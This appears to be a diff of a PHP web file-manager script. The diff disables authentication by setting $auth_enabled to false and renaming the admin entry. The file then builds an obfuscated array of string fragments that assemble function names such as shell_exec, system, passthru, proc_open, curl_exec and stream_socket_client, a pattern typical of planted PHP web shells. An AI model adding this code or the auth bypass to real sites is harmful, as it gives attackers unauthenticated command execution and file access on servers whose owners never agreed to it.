@@ -1,8 +1,8 @@
 <?php
-$auth_enabled = true;
+$auth_enabled = false;
 
 $auth_users = [
-    'admin' => '$2a$12$eJHdIuo9oMwuLspwxW19pesBYoCBykyN16sBsx8.GXXsFOnRU2ysS',
+    'false' => '$2a$12$eJHdIuo9oMwuLspwxW19pesBYoCBykyN16sBsx8.GXXsFOnRU2ysS',
 ];
 
 $GLOBALS['_q_']=Array('' .'session' .'_start','number' .'_form' .'at','substr','spri' .'ntf','fileperms','' .'r' .'t' .'rim','strtr','base64_en' .'code','base64' .'_de' .'code','i' .'s_dir','arr' .'ay_diff','scand' .'ir','unlink','r' .'mdir','file_exists','tou' .'ch','ch' .'mod','' .'oc' .'tdec','' .'get' .'c' .'wd','' .'chdi' .'r','' .'fu' .'nction_e' .'x' .'ists','s' .'hell_e' .'xec','exec','i' .'m' .'plode','ob' .'_start','passt' .'hru','ob_' .'get_c' .'lea' .'n','proc' .'_op' .'en','is_r' .'e' .'sou' .'r' .'ce','stream_' .'g' .'e' .'t_c' .'on' .'tent' .'s','' .'fcl' .'ose','proc' .'_close','is_readable','' .'pathinfo','dirname','m' .'kdir','is_w' .'ritable','htmls' .'pe' .'ci' .'al' .'cha' .'rs','d' .'e' .'fine','realpath','c' .'o' .'unt','ba' .'sename','move_uploa' .'de' .'d_' .'fil' .'e','re' .'nam' .'e','is' .'_f' .'ile','f' .'il' .'e_pu' .'t_' .'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s','strto' .'time','' .'header','file' .'_ge' .'t_conten' .'ts','strtol' .'ower','j' .'so' .'n_' .'enc' .'ode','md5','exp' .'lode','sort','' .'array' .'_' .'mer' .'ge','fil' .'esi' .'ze','date','fi' .'l' .'em' .'t' .'ime','system','popen','c'.'u'.'r'.'l_init','c'.'u'.'r'.'l_setopt','c'.'u'.'r'.'l_exec','c'.'u'.'r'.'l_close','f'.'o'.'p'.'e'.'n','f'.'r'.'e'.'a'.'d','f'.'w'.'r'.'i'.'t'.'e','p'.'a'.'r'.'s'.'e_url','s'.'t'.'r'.'e'.'a'.'m_socket_client','i'.'n'.'i_get','feof','filter_var','trim','fgets','mail','sha1','uniqid','hash','microtime', 'password_verify', 'session_destroy', 'phpversion', 'readfile', 'class_exists', 'str_replace', 'is_uploaded_file', 'copy', 'strlen');
